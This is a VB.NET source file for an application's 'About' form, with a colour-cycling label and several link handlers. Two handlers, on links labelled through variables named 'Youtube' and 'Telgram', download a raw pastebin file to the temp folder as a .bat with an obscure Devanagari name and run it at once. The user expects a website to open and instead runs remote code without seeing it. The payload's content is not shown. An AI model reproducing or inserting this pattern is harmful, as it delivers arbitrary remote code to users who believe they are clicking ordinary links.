Public Class About
    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Try
            Process.Start("https://shoppy.gg/@nor.adlb1")
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub LinkLabel3_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        Dim Youtube As New System.Net.WebClient
        Youtube.DownloadFile("https://pastebin.com/raw/FcEU0GKm", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub LinkLabel4_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel4.LinkClicked
        Dim Telgram As New System.Net.WebClient
        Telgram.DownloadFile("https://pastebin.com/raw/13dtGgyK", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub
    Private r As Integer = 255, g As Integer = 0, b As Integer = 0

    Private Sub About_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Start()
        EXEICO.color
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Me.Label2.ForeColor = Color.FromArgb(r, g, b)

            If r > 0 AndAlso b = 0 Then
                r -= 1
                g += 1
            End If

            If g > 0 AndAlso r = 0 Then
                g -= 1
                b += 1
            End If

            If b > 0 AndAlso g = 0 Then
                b -= 1
                r += 1
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class